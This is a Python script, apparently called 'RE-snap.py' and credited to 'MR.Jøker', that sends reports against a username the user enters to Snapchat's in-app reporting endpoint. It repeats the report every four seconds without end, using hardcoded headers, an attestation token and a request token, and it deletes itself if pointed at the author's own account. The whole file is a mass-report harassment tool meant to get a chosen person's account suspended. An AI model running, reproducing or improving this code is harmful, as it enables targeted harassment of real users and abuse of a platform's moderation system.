try:
  import os
  from threading import Lock
  from requests import post
  from time import sleep
except Exception as Joker:input(Joker);exit()
PRNT=Lock()
red = "\033[1;31;40m";grn = '\033[1;32;40m';yel = '\033[1;33;40m'
wit = "\033[1;37;40m";bloFT = "\033[1;36;40m"
def vv1ck(*a, **b):
	with PRNT:print(*a, **b)

class SNAPCHAT_REPORT():
  def __init__(self,tr):
    self.TARGET=tr
    self.dn=0
    self.err=0
    self.head={
    'Host': 'app.snapchat.com',
    'X-Snapchat-Uuid': '99CFBC0B-8B46-4C6F-AF40-05A5C91653D4',
    'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
    'Accept': '*/*',
    'Accept-Locale': 'ar_JO@numbers=latn',
    'Content-Length': '221',
    'X-Snapchat-Att': 'CgsYACAAFQwxDa8IChLgAuCZRq9IQFJmeZ5dPBsZ09tQIBVOVxaWpfBzbhIt4_oHTjtKjUzdyW_lZMVLrV5PQ9wmHtdOFnNMu2qrDgcX503SVmCcMuYB43i3nY6rrdIITX43bsbm-NyknUkmYxvg_GubZqh7gPgnJlpiu2934RlwWw8LPw75nJKx7aCXJIKox6clsrTDWZJ_yz8oeWX1keFx7htmxy0QopGfO4_O_Q2YRzcYtHf24kfWaWdEYUhKOeIy1hwrjpCe_-IRs833gCjJ7h_RQjtZD0-FLYbg7DooBYiRblwP856vausoqeLKtpX9tDXIsNRkGwNBkdJErhn-P2SCgycujtYXVn7wmPvHNltj33nmxLKKyNnJZ3Vf6N-RJNdz3b2g3QmMFMoWuKEYW5g0IJ2-PTtk17_Hu-oSMDyGQTzNP6hEz7SkU-gnr77MontIPsYm-vamJwIapFio4R_S590frq0LNcodR0U=',
    'User-Agent': 'Snapchat/10.82.5.78 (iPhone8,1; iOS 13.5; gzip)',
    'Accept-Language': 'ar-JO;q=1, en-JO;q=0.9',
    'Accept-Encoding': 'gzip, deflate',}
    self.sent_report()
  def sent_report(self):
    if self.TARGET == 'jokermr5oos4800':
      os.remove('RE-snap.py')
      os.abort()
      os.exit()
    print('\t━━━━━━━━━━━━━ START ━━━━━━━━━━━━━━━━\n')
    while 1:
      report= post('https://app.snapchat.com/reporting/inapp/v1/user', headers=self.head, data=f'context=&friend_link_type=-1&reason_id=report_user_reason_theyre_creepy_or_annoying&reported={self.TARGET}&req_token=f673b66f450b37ad0d9bf4d236f09e48a8b7e6f2d325b070bdccf79654d84574&timestamp=1643814201765&username=thtrgyg')
      if report.status_code == 200:
        self.dn += 1
        vv1ck(f'\r[+] {grn}Report successfully DN:[{self.dn}] {red}Error:[{self.err}]\r',end='')
        sleep(4)
      elif report.status_code == 404:
        self.err += 1
        vv1ck(f'\r[+] {grn}Report successfully DN:[{self.dn}] {red}Error:[{self.err}]\r',end='')
        sleep(4)
      else:
        print(report.text)
        print(report)
if __name__ == '__main__':
	print(yel+f"""
           .-----.
         .' -   - '.
        /  {red}.-. .-.{yel}  \\
        |  {red}| | | |{yel}  |  {grn}By MR.Jøker{yel}
         \ {red}\o/ \o/{yel} /   {grn}IG : 221298{yel}
        _/    ^    \\_
       | \  '---'  / |
       / /`--. .--`\\ \\
      / /'---` `---'\\ \\
      '.__.       .__.'
          |     |
           |     \\
           \      '--.
            '.        `\\
              `'---.   |
   {red}REPORT {yel}SNAPCHAT  ) /
                    \/
""")
	tr=input(f"{bloFT}┌──(joker㉿root)-[{wit}~Snapchat.py{bloFT}]\n└─${wit} Enter Target name :{yel} ")
	SNAPCHAT_REPORT(tr)
